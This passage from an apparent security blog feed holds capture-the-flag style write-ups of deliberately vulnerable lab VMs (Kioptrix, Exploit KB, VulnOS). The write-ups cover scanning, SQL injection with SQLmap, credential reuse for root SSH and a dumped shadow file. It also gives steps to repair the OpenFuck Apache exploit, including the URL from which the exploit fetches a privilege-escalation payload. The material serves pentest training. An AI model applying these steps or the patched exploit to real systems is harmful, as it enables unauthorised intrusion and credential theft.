</span></code></pre></td></tr></table></div></figure>


<p>Then, download the Root exploit, compile it, run it and you&rsquo;re root.</p>

<p><img src="http://paulsec.github.io/images/kioptrix/2/privilege-escalation-root-id.png" width="75%" height="75%"/></p>

<p><em>Fig. Exploit worked and we&rsquo;re now root</em></p>

<p>Then, we read the <strong>/etc/shadow</strong>, crack the password etc.</p>

<p>Hope you liked it and good evening !</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Exploit KB Vulnerable Web App 1: Write-up]]></title>
    <link href="http://paulsec.github.io/blog/2014/04/15/exploit-kb-vulnerable-web-app-1-write-up/"/>
    <updated>2014-04-15T20:29:34+02:00</updated>
    <id>http://paulsec.github.io/blog/2014/04/15/exploit-kb-vulnerable-web-app-1-write-up</id>
    <content type="html"><![CDATA[<p><strong>This post contains the steps to get a root shell with Exploit KB Vulnerable Web App 1 VM</strong></p>

<p>This VM can he found <a href="http://vulnhub.com/entry/exploit-kb-vulnerable-web-app-1,44/">here</a>. Have a look to find even more VMs</p>

<h3><strong>Host discovery</strong></h3>

<p>First, we need to discover where the machine is on our network.
To do so, let&rsquo;s use Nmap:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -sP 192.168.1.1/24 </span></code></pre></td></tr></table></div></figure>


<h3><strong>Fingerprinting</strong></h3>

<p>After getting the IP address, we need to do some fingerprinting.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -sV 192.168.1.23</span></code></pre></td></tr></table></div></figure>


<p><img src="http://paulsec.github.io/images/exploit-kb/nmap-result.png" width="75%" height="75%"/></p>

<p><em>Fig. Nmap scan result</em></p>

<p>As we saw it, there were only two services available on this host: SSH and Apache.
I decided to use Nikto to scan the Web server.</p>

<p>Here are the report :</p>

<p><img src="http://paulsec.github.io/images/exploit-kb/nikto-result.png" width="75%" height="75%"/></p>

<p><em>Fig. Nikto report on ports 80 (HTTP)</em></p>

<p>There were (loads) of interesting things here, but some of the most interesting :</p>

<ul>
<li>/database/</li>
<li>/admin/</li>
<li>and the website itself !</li>
</ul>


<p>Let&rsquo;s exploit it !</p>

<h3><strong>Exploitation</strong></h3>

<p>First, there&rsquo;s some <em>directory listing</em> on /database/ and there was an interesting backup: <strong>exploit.sql</strong>.
In this file, we managed to gather some credentials which were not hashed !</p>

<p><img src="http://paulsec.github.io/images/exploit-kb/directory-listing-exploit.png" width="50%" height="50%"/></p>

<p><em>Fig. Directory Listing of /database/</em></p>

<p><img src="http://paulsec.github.io/images/exploit-kb/exploit-sql.png" width="50%" height="50%"/></p>

<p><em>Fig. SQL Backup: Exploit.sql</em></p>

<p>Then, we were able to connect to the platform.</p>

<p><img src="http://paulsec.github.io/images/exploit-kb/admin-login-page.png" width="50%" height="50%"/></p>

<p><em>Fig. Admin login page</em></p>

<p><img src="http://paulsec.github.io/images/exploit-kb/admin-logged.png" width="75%" height="75%"/></p>

<p><em>Fig. Connected as &lsquo;Admin&rsquo;</em></p>

<p>While playing with the application, some URLs were interesting :</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>http://192.168.1.23/newspage.php?id=1</span></code></pre></td></tr></table></div></figure>


<p>I decided to check for some SQL injection and used SQLmap to exploit those:</p>

<p><img src="http://paulsec.github.io/images/exploit-kb/sqlmap-database.png" width="75%" height="75%"/></p>

<p><em>Fig. Dumping all databases through SQL Injection</em></p>

<p><img src="http://paulsec.github.io/images/exploit-kb/sqlmap-crack-password.png" width="75%" height="75%"/></p>

<p><em>Fig. Dumping all MySQL&rsquo;s users/passwords, and cracking them</em></p>

<p>Thanks to this vulnerability, we&rsquo;ve been able to dump the entire Database System (Which was a MySQL Backend System).
We managed to crack Mysql users&rsquo;s password which was&hellip;: <strong>toor</strong>.</p>

<p>With those (re-used &amp; weak) credentials, we were able to connect to the root&rsquo;s account through SSH.
Then, we had <em>root</em> access.</p>

<p><img src="http://paulsec.github.io/images/exploit-kb/shell-root-id.png" width="75%" height="75%"/></p>

<p><em>Fig. Connecting through SSH with root&rsquo;s credential</em></p>

<p><img src="http://paulsec.github.io/images/exploit-kb/shell-root-cat-shadow.png" width="75%" height="75%"/></p>

<p><em>Fig. Cat /etc/shadow</em></p>

<p>Really easy VM but really interesting one to practice with.</p>

<p>Hope you liked it ! Cheers.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Kioptrix 1: Write-up]]></title>
    <link href="http://paulsec.github.io/blog/2014/04/14/kioptrix-1-write-up/"/>
    <updated>2014-04-14T21:52:50+02:00</updated>
    <id>http://paulsec.github.io/blog/2014/04/14/kioptrix-1-write-up</id>
    <content type="html"><![CDATA[<p><strong>This post contains the steps to get a root shell with Kioptrix level 1 VM</strong></p>

<p>This VM can he found <a href="http://vulnhub.com/entry/kioptrix_level-1-1,22/">here</a>. Have a look to find even more VMs</p>

<h4><strong>Host discovery</strong></h4>

<p>First, we need to discover where the machine is on our network.
To do so, let&rsquo;s use Nmap:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -sP 192.168.1.1/24 </span></code></pre></td></tr></table></div></figure>


<h4><strong>Fingerprinting</strong></h4>

<p>After getting the IP address, we need to do some fingerprinting.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -sV 192.168.1.2</span></code></pre></td></tr></table></div></figure>


<p><img src="http://paulsec.github.io/images/kioptrix/1/nmap.png" width="75%" height="75%"/></p>

<p><em>Fig. Nmap scan result</em></p>

<p>As I saw it in the scan report, I decided to scan on the port 80 and 443 with <strong>DirBuster</strong> and <strong>Nikto</strong>.</p>

<p>Here are the reports :</p>

<p><img src="http://paulsec.github.io/images/kioptrix/1/dirbuster.png" width="75%" height="75%"/></p>

<p><em>Fig. DirBuster Report on the port 80</em></p>

<p><img src="http://paulsec.github.io/images/kioptrix/1/nikto.png" width="75%" height="75%"/></p>

<p><em>Fig. Nikto report on ports 80 (HTTP) and 443 (HTTPS)</em></p>

<p>There was no vulnerable web application or any interesting file.
However, the Apache version is vulnerable..</p>

<h4><strong>Exploitation with Apache OpenSSL Exploit</strong></h4>

<p>Thanks to Nmap result, I saw that the Apache version was vulnerable: <strong>Apache 1.3.20</strong>.
Then, I decided to look on the internet and I found this expoit: <a href="http://www.exploit-db.com/exploits/764/">Apache OpenSSL &ndash; Remote Exploit (Multiple Targets) (OpenFuckV2.c)</a></p>

<p>I had issues with this exploit because it&rsquo;s quite an old one and the instructions were outdated.
You can follow the instructions <a href="http://paulsec.github.io/blog/2014/04/14/updating-openfuck-exploit/">here</a> to update the exploit and run it on your computer. (Tested on <a href="http://www.kali.org/">Kali Linux</a>).</p>

<p>We had information on the box and I did a <code>grep</code> to see what OS were vulnerable to Apache 1.3.20 :</p>

<p><img src="http://paulsec.github.io/images/kioptrix/1/openfuck_select.png" width="75%" height="75%"/></p>

<p><em>Fig. Selecting the option (depending on the OS) for the exploit</em></p>

<p>Then, I tried the exploit :</p>

<p><img src="http://paulsec.github.io/images/kioptrix/1/openfuck_exploit.png" width="75%" height="75%"/></p>

<p><em>Fig. Using OpenFuck Exploit after multiple attempts</em></p>

<h4><strong>Interesting files</strong></h4>

<p>We got the root shell and that was the goal of this VM.
Then, you can do everything like get content of <code>/etc/shadow</code>.</p>

<p><img src="http://paulsec.github.io/images/kioptrix/1/cat_shadow.png" width="75%" height="75%"/></p>

<p><em>Fig. Shadow file on the vulnerable server</em></p>

<p>Hope you liked it ! Cheers.</p>

<p>ps: I&rsquo;ll add exploitation using Samba in the next few days. Keep tuned !</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Updating OpenFuck Exploit]]></title>
    <link href="http://paulsec.github.io/blog/2014/04/14/updating-openfuck-exploit/"/>
    <updated>2014-04-14T20:46:29+02:00</updated>
    <id>http://paulsec.github.io/blog/2014/04/14/updating-openfuck-exploit</id>
    <content type="html"><![CDATA[<p>This blog post will be quite fast and will provide you the steps to update the <a href="http://www.exploit-db.com/exploits/764/">OpenFuck</a> exploit.</p>

<p>This exploit is pretty old but you might need it if you have fun with some vulnerable VMs. Not giving any hint. :&ndash;)</p>

<p>Thanks to this <a href="http://hackingbalg.blogspot.fr/">blog</a>, I&rsquo;ve been able to update the exploit.</p>

<p>Here are the steps to make this work :</p>

<ul>
<li><strong>1) Add those headers :</strong></li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;openssl/rc4.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;openssl/md5.h&gt; </span>
</span></code></pre></td></tr></table></div></figure>


<ul>
<li><strong>2) Update the URL of the C file.</strong></li>
</ul>


<p>Search for <code>wget</code></p>

<p>and replace the URL with this new one :</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="nl">http:</span><span class="c1">//dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c</span>
</span></code></pre></td></tr></table></div></figure>


<ul>
<li><strong>3) Get libssl-dev lib</strong></li>
</ul>


<p>Install them :</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">apt</span><span class="o">-</span><span class="n">get</span> <span class="n">install</span> <span class="n">libssl</span><span class="o">-</span><span class="n">dev</span>
</span></code></pre></td></tr></table></div></figure>


<ul>
<li><strong>4) Update declaration of variables</strong></li>
</ul>


<p>Line 961, change :</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">p</span><span class="p">,</span> <span class="o">*</span><span class="n">end</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>By adding <strong>const</strong> :</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">p</span><span class="p">,</span> <span class="o">*</span><span class="n">end</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<ul>
<li><strong>5) Compile then code and you&rsquo;re done</strong></li>
</ul>


<p>To compile :</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">gcc</span> <span class="o">-</span><span class="n">o</span> <span class="n">OpenFuck</span> <span class="mf">764.</span><span class="n">c</span> <span class="o">-</span><span class="n">lcrypto</span>
</span></code></pre></td></tr></table></div></figure>


<p>Hope this can help you out if you got stuck with this exploit. Cheers !</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[VulnOS: Write-up]]></title>
    <link href="http://paulsec.github.io/blog/2014/04/08/vulnos-write-up/"/>
    <updated>2014-04-08T21:47:04+02:00</updated>
    <id>http://paulsec.github.io/blog/2014/04/08/vulnos-write-up</id>
    <content type="html"><![CDATA[<p><strong>This contains the solution of the VM: VulnOS.</strong></p>

<p>This is my first write-up for a VM and I&rsquo;m doing it for VulnOS which is hosted on <a href="http://vulnhub.com/">VulnHub</a> (Great resource if you want to improve your pentesting skills).</p>

<p>In this &lsquo;tutorial&rsquo;, I&rsquo;m gonna give you the steps I reproduced to get a shell on the machine.</p>

<h4>Discovery</h4>

<p>First, start by scanning the network to discover where&rsquo;s the host.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -sV 192.168.56.1/24
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.41SVN ( http://nmap.org ) at 2014-04-08 21:23 CEST
</span><span class='line'>Nmap scan report for 192.168.56.1
</span><span class='line'>Host is up (0.00049s latency).
</span><span class='line'>Nmap scan report for 192.168.56.105
</span><span class='line'>Host is up (0.00018s latency).</span></code></pre></td></tr></table></div></figure>


<p>We managed to get the IP of the machine.
Let&rsquo;s do some fingerprinting.</p>

<h4>Fingerprinting</h4>

<p>I still used <a href="http://nmap.org/">nmap</a> to do this :
<img src="http://paulsec.github.io/images/vulnos/nmap_scan.png" width="75%" height="75%"/></p>

<p>Port 80 and 8080 are open. I used <a href="https://www.cirt.net/Nikto2">nikto</a> and <a href="https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project">DirBuster</a> to do even more fingerprinting.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>./nikto.pl -h http://192.168.56.105
</span><span class='line'>- Nikto v2.1.5
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ Target IP:          192.168.56.105
</span><span class='line'>+ Target Hostname:    192.168.56.105
</span><span class='line'>+ Target Port:        80
</span><span class='line'>+ Start Time:         2014-04-08 21:29:47 (GMT2)
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ Server: Apache/2.2.14 (Ubuntu)
</span><span class='line'>+ Server leaks inodes via ETags, header found with file /, inode: 1062203, size: 745, mtime: 0x4f5c81e0490a0
</span><span class='line'>+ The anti-clickjacking X-Frame-Options header is not present.
</span><span class='line'>+ Apache/2.2.14 appears to be outdated (current is at least Apache/2.2.22). Apache 1.3.42 (final release) and 2.0.64 are also current.
</span><span class='line'>+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
</span><span class='line'>+ OSVDB-3268: /doc/: Directory indexing found.
</span><span class='line'>+ OSVDB-48: /doc/: The /doc/ directory is browsable. This may be /usr/doc.
</span><span class='line'>+ OSVDB-3268: /imgs/: Directory indexing found.
</span><span class='line'>+ OSVDB-3092: /imgs/: This might be interesting...
</span><span class='line'>+ Retrieved x-powered-by header: PHP/5.3.2-1ubuntu4.23
</span><span class='line'>+ OSVDB-3092: /phpmyadmin/changelog.php: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
</span><span class='line'>+ OSVDB-3093: /.htaccess: Contains authorization information
</span><span class='line'>+ OSVDB-3268: /icons/: Directory indexing found.
</span><span class='line'>+ Cookie phpMyAdmin created without the httponly flag
</span><span class='line'>+ OSVDB-3233: /icons/README: Apache default file found.
</span><span class='line'>+ Cookie 5d89dac18813e15aa2f75788275e3588 created without the httponly flag
</span><span class='line'>+ /phpldapadmin/: Admin login page/section found.
</span><span class='line'>+ Cookie PPA_ID created without the httponly flag
</span><span class='line'>+ /phppgadmin/: Admin login page/section found.
</span><span class='line'>+ /phpmyadmin/: phpMyAdmin directory found
</span><span class='line'>+ 6544 items checked: 0 error(s) and 19 item(s) reported on remote host
</span><span class='line'>+ End Time:           2014-04-08 21:30:08 (GMT2) (21 seconds)
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ 1 host(s) tested
</span></code></pre></td></tr></table></div></figure>


<p>I also used DirBuster to get some folders :</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Starting OWASP DirBuster 0.12
</span><span class='line'>Starting dir/file list based brute forcing
</span><span class='line'>Dir found: /cgi-bin/ - 403
</span><span class='line'>Dir found: / - 200
</span><span class='line'>File found: /index2.html - 200
</span><span class='line'>Dir found: /imgs/ - 200
</span><span class='line'>Dir found: /icons/ - 200
</span><span class='line'>Dir found: // - 200
</span><span class='line'>Dir found: /icons/ - 200
</span><span class='line'>File found: //index2.html - 200
</span><span class='line'>Dir found: //imgs/ - 200
</span><span class='line'>Dir found: /phpmyadmin/ - 200
</span><span class='line'>Dir found: /phppgadmin/ - 200
</span><span class='line'>File found: /phpmyadmin/Documentation.html - 200
</span><span class='line'>Dir found: /phpmyadmin/themes/ - 403
</span><span class='line'>Dir found: /phpsysinfo/ - 200
</span><span class='line'>Dir found: /phpmyadmin/themes/original/ - 403
</span><span class='line'>Dir found: /phpmyadmin/themes/original/img/ - 403
</span><span class='line'>Dir found: /phpgroupware/ - 302
</span><span class='line'>File found: /phpsysinfo/index.php - 200
</span><span class='line'>File found: /phppgadmin/browser.php - 200
</span><span class='line'>File found: /phppgadmin/intro.php - 200
</span><span class='line'>File found: /phpmyadmin/index.php - 200
</span><span class='line'>Dir found: /imgs/ - 200
</span><span class='line'>Dir found: /phppgadmin/images/ - 403
</span><span class='line'>Dir found: /phppgadmin/images/themes/ - 403
</span><span class='line'>Dir found: /phppgadmin/images/themes/default/ - 403
</span><span class='line'>Dir found: /phppgadmin/xloadtree/ - 403
</span><span class='line'>File found: /phppgadmin/xloadtree/xtree2.js - 200
</span><span class='line'>File found: /phppgadmin/xloadtree/xloadtree2.js - 200
</span><span class='line'>File found: /phppgadmin/redirect.php - 200
</span><span class='line'>File found: /phppgadmin/servers.php - 200
</span><span class='line'>File found: /phpmyadmin/translators.html - 200
</span><span class='line'>File found: /phpmyadmin/license.php - 200
</span><span class='line'>File found: /phpmyadmin/changelog.php - 200
</span><span class='line'>Dir found: /phpmyadmin/setup/ - 401
</span><span class='line'>Dir found: /egroupware/ - 302
</span><span class='line'>Dir found: /insecure/ - 200
</span><span class='line'>File found: /insecure/LICENSE.txt - 200
</span><span class='line'>File found: /insecure/ReadMe.html - 200
</span><span class='line'>File found: /insecure/insecure.xml - 200
</span><span class='line'>File found: /insecure/insecure.war - 200
</span><span class='line'>Dir found: /mediawiki/ - 301
</span><span class='line'>Dir found: // - 200
</span><span class='line'>Dir found: /phpldapadmin/ - 200
</span><span class='line'>File found: /phpldapadmin/index.php - 200
</span><span class='line'>Dir found: /phpldapadmin/images/ - 403
</span><span class='line'>File found: /phpldapadmin/cmd.php - 200
</span><span class='line'>Dir found: /phpldapadmin/images/default/ - 200
</span><span class='line'>Dir found: /phpldapadmin/js/ - 403
</span><span class='line'>File found: /phpldapadmin/js/ajax_functions.js - 200
</span><span class='line'>Dir found: /phpldapadmin/js/jscalendar/ - 403
</span><span class='line'>File found: /phpldapadmin/js/jscalendar/calendar.js - 200
</span><span class='line'>File found: /phpldapadmin/js/layersmenu-browser_detection.js - 200
</span><span class='line'>File found: /phpldapadmin/js/ajax_tree.js - 200</span></code></pre></td></tr></table></div></figure>


<p>On the port 8080, nothing much with DirBuster :</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Starting dir/file list based brute forcing
</span><span class='line'>Dir found: / - 200
</span><span class='line'>Dir found: /docs/ - 200
</span><span class='line'>Dir found: // - 200
</span><span class='line'>Dir found: // - 200</span></code></pre></td></tr></table></div></figure>


<p>And with Nikto:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>./nikto.pl -h http://192.168.56.105:8080
</span><span class='line'>- Nikto v2.1.5
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ Target IP:          192.168.56.105
</span><span class='line'>+ Target Hostname:    192.168.56.105
</span><span class='line'>+ Target Port:        8080
</span><span class='line'>+ Start Time:         2014-04-08 21:55:59 (GMT2)
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ Server: Apache-Coyote/1.1
</span><span class='line'>+ Server leaks inodes via ETags, header found with file /, fields: 0xW/1887 0x1394395959000 
</span><span class='line'>+ The anti-clickjacking X-Frame-Options header is not present.
</span><span class='line'>+ No CGI Directories found (use '-C all' to force check all possible dirs)
</span><span class='line'>+ Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS 
</span><span class='line'>+ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
</span><span class='line'>+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
</span><span class='line'>+ /: Appears to be a default Apache Tomcat install.
</span><span class='line'>+ /examples/servlets/index.html: Apache Tomcat default JSP pages present.
</span><span class='line'>+ Cookie JSESSIONID created without the httponly flag
</span><span class='line'>+ OSVDB-3720: /examples/jsp/snp/snoop.jsp: Displays information about page retrievals, including other users.
</span><span class='line'>+ /manager/html: Default Tomcat Manager interface found
</span><span class='line'>+ 6544 items checked: 0 error(s) and 10 item(s) reported on remote host
</span><span class='line'>+ End Time:           2014-04-08 21:57:01 (GMT2) (62 seconds)
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ 1 host(s) tested</span></code></pre></td></tr></table></div></figure>


<p>Thanks to the nmap scan, there are a lot of services which are available.
I did lot of attempts to exploit MySQL, the IRC daemon, SMTP, .. but it didn&rsquo;t work.</p>

<p>Then, I decided to check Webmin service.</p>

<h4>Exploitation</h4>

<p>To do so, I started to use Metasploit to see if there was relevant exploit.
And there was one :</p>

<p><img src="http://paulsec.github.io/images/vulnos/metasploit_webmin_exploit.png" /></p>

<p>I decided to use <em>auxiliary/admin/webmin/file_disclosure</em>.</p>

<p>Using this flaw, I&rsquo;ve been able to get <strong>/etc/shadow</strong> because we have root privileges.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root:*:16137:0:99999:7:::
</span><span class='line'>daemon:*:16137:0:99999:7:::
</span><span class='line'>bin:*:16137:0:99999:7:::
</span><span class='line'>sys:*:16137:0:99999:7:::
</span><span class='line'>sync:*:16137:0:99999:7:::
</span><span class='line'>games:*:16137:0:99999:7:::
</span><span class='line'>man:*:16137:0:99999:7:::
</span><span class='line'>lp:*:16137:0:99999:7:::
</span><span class='line'>mail:*:16137:0:99999:7:::
</span><span class='line'>news:*:16137:0:99999:7:::
</span><span class='line'>uucp:*:16137:0:99999:7:::
</span><span class='line'>proxy:*:16137:0:99999:7:::
</span><span class='line'>www-data:*:16137:0:99999:7:::
</span><span class='line'>backup:*:16137:0:99999:7:::
</span><span class='line'>list:*:16137:0:99999:7:::
</span><span class='line'>irc:*:16137:0:99999:7:::
</span><span class='line'>gnats:*:16137:0:99999:7:::
</span><span class='line'>nobody:*:16137:0:99999:7:::
</span><span class='line'>libuuid:!:16137:0:99999:7:::
</span><span class='line'>syslog:*:16137:0:99999:7:::
</span><span class='line'>landscape:*:16137:0:99999:7:::
</span><span class='line'>vulnosadmin:$6$SLXu95CH$pVAdp447R4MEFKtHrWcDV7WIBuiP2Yp0NJTVPyg37K9U11SFuLena8p.xbnSVJFAeg1WO28ljNAPrlXaghLmo/:16137:0:99999:7:::
</span><span class='line'>sysadmin:admin:16137:0:99999:7:::
</span><span class='line'>webmin:webmin:16137:0:99999:7:::
</span><span class='line'>hackme:hackme:16137:0:99999:7:::
</span><span class='line'>sa:password1:16137:0:99999:7:::
</span><span class='line'>stupiduser:stupiduser:16137:0:99999:7:::
</span><span class='line'>messagebus:*:16137:0:99999:7:::
</span><span class='line'>distccd:*:16137:0:99999:7:::
</span><span class='line'>sshd:*:16138:0:99999:7:::
</span><span class='line'>openldap:!:16138:0:99999:7:::
</span><span class='line'>ftp:!:16138:0:99999:7:::
</span><span class='line'>mysql:!:16138:0:99999:7:::
</span><span class='line'>telnetd:*:16138:0:99999:7:::
</span><span class='line'>bind:*:16138:0:99999:7:::
</span><span class='line'>postgres:*:16138:0:99999:7:::
</span><span class='line'>postfix:*:16138:0:99999:7:::
</span><span class='line'>dovecot:*:16138:0:99999:7:::
</span><span class='line'>tomcat6:*:16138:0:99999:7:::
</span><span class='line'>statd:*:16138:0:99999:7:::
</span><span class='line'>snmp:*:16138:0:99999:7:::
</span><span class='line'>nagios:!:16140:0:99999:7:::
</span><span class='line'>openerp:*:16140:0:99999:7:::</span></code></pre></td></tr></table></div></figure>


<p>We can now use this and (try to) crack the password with John the ripper.</p>

<p>However, this hasn&rsquo;t been successful for me.
So, I decided to get Apache&rsquo;s access logs.
Thanks to this, I&rsquo;ve been able to detect even more Web applications: MediaWiki, dolibarr-3.0.0, egroupware, And DVWA (Damn Vulnerable Web App)&hellip;</p>

<p>I also had access to all the files I wanted, so I gathered credentials for the database.
It was then possible to login through the phpmyadmin pannel using: <strong>webmin</strong>/<strong>webmin</strong>.</p>

<p><img src="http://paulsec.github.io/images/vulnos/phpmyadmin_wikiuser.png" width="75%" height="75%"/></p>

